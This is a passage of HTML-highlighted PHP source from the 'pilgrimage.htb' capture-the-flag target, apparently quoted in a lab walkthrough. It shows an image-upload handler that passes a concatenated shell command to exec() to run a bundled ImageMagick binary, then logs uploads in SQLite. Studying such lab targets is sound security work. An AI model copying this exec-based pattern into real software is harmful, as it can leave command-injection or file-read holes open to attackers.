+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">    <span class="z-keyword z-control z-php">return</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"><span class="z-constant z-character z-escape z-php">\&quot;</span></span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-variable z-other z-global z-safer z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_SESSION</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">user</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"><span class="z-constant z-character z-escape z-php">\&quot;</span></span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"></span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-end z-php">}</span></span></span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-keyword z-control z-php">if</span> <span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-variable z-other z-global z-safer z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_SERVER</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">REQUEST_METHOD</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span> <span class="z-keyword z-operator z-comparison z-php">===</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">POST</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-section z-group z-end z-php">)</span></span> <span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>image</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-keyword z-other z-new z-php">new</span> <span class="z-meta z-path z-php"><span class="z-support z-other z-namespace z-php">Bulletproof</span><span class="z-punctuation z-separator z-namespace z-php">\</span><span class="z-support z-class z-php">Image</span></span><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_FILES</span><span class="z-punctuation z-section z-group z-end z-php">)</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-keyword z-control z-php">if</span> <span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>image</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">toConvert</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-punctuation z-section z-group z-end z-php">)</span></span> <span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>image</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">setLocation</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">/var/www/pilgrimage.htb/tmp</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>image</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">setSize</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-constant z-numeric z-integer z-decimal z-php">100</span><span class="z-punctuation z-separator z-php">,</span> <span class="z-constant z-numeric z-integer z-decimal z-php">4000000</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>image</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">setMime</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-array z-php"><span class="z-punctuation z-section z-array z-begin z-php">[</span><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">png</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span>, <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">jpeg</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-section z-array z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>upload</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>image</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">upload</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-keyword z-control z-php">if</span> <span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>upload</span><span class="z-punctuation z-section z-group z-end z-php">)</span></span> <span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">            <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>mime</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">.png</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">            <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>imagePath</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>upload</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">getFullPath</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">            <span class="z-keyword z-control z-php">if</span> <span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-fileinfo z-php">mime_content_type</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>imagePath</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span> <span class="z-keyword z-operator z-comparison z-php">===</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">image/jpeg</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-section z-group z-end z-php">)</span></span> <span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">                <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>mime</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">.jpeg</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">            <span class="z-punctuation z-section z-block z-end z-php">}</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">            <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>newname</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-basic_functions z-php">uniqid</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">            <span class="z-meta z-function-call z-php"><span class="z-support z-function z-exec z-php">exec</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php">
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php">                <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span> <span class="z-keyword z-operator z-string z-php">.</span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php">                    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>upload</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">getName</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span> <span class="z-keyword z-operator z-string z-php">.</span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php">                    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>mime</span> <span class="z-keyword z-operator z-string z-php">.</span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php">                    <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"> </span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">-resize 50% /var/www/pilgrimage.htb/shrunk/</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span> <span class="z-keyword z-operator z-string z-php">.</span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php">                    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>newname</span> <span class="z-keyword z-operator z-string z-php">.</span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php">                    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>mime</span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php">            <span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">            <span class="z-meta z-function-call z-php"><span class="z-support z-function z-file z-php">unlink</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>upload</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">getFullPath</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">            <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>upload_path</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">http://pilgrimage.htb/shrunk/</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>newname</span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>mime</span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">            <span class="z-keyword z-control z-php">if</span> <span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-construct z-php">isset</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-safer z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_SESSION</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">user</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-section z-group z-end z-php">)</span></span> <span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">                <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>db</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-keyword z-other z-new z-php">new</span> <span class="z-meta z-path z-php"><span class="z-support z-class z-builtin z-php">PDO</span></span><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">sqlite:/var/db/pilgrimage</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-section z-group z-end z-php">)</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">                <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>stmt</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>db</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">prepare</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php">
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php">                    <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"><span class="z-source z-sql"><span class="z-keyword z-other z-DML z-sql">INSERT INTO</span> <span class="z-string z-quoted z-other z-backtick z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">`</span>images<span class="z-punctuation z-definition z-string z-end z-sql">`</span></span> (url,original,username) <span class="z-keyword z-other z-DML z-II z-sql">VALUES</span> (?,?,?)</span></span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php">                <span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">                <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>stmt</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">execute</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-array z-php"><span class="z-punctuation z-section z-array z-begin z-php">[</span>
+</span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-array z-php">                    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>upload_path</span>,
+</span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-array z-php">                    <span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_FILES</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">toConvert</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">name</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span>,
+</span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-array z-php">                    <span class="z-variable z-other z-global z-safer z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_SESSION</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">user</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span>,
